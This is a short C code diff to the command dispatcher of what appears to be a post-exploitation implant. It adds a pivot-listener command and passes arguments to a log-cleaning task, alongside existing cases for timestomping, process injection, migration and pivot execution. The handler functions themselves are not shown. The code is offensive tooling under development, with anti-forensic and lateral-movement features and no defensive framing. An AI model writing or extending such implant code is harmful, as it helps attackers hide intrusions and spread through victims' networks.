@@ -66,7 +66,7 @@ int handle_command(uint32_t code, uint32_t cmd_id,
         case COMMAND_TIMESTOMP:
             return task_timestomp(data, data_len, response);
         case COMMAND_CLEANLOG:
-            return task_cleanlog(response);
+            return task_cleanlog(data, data_len, response);
         case COMMAND_INJECT:
             return task_inject(data, data_len, response);
         case COMMAND_MIGRATE:
@@ -117,6 +117,8 @@ int handle_command(uint32_t code, uint32_t cmd_id,
             return task_unlink(data, data_len, response);
         case COMMAND_PIVOT_EXEC:
             return task_pivot_exec(data, data_len, response);
+        case COMMAND_PIVOT_LISTEN:
+            return task_pivot_listen(data, data_len, response);
 
         default:
             return cmd_error(response, "Unknown command");
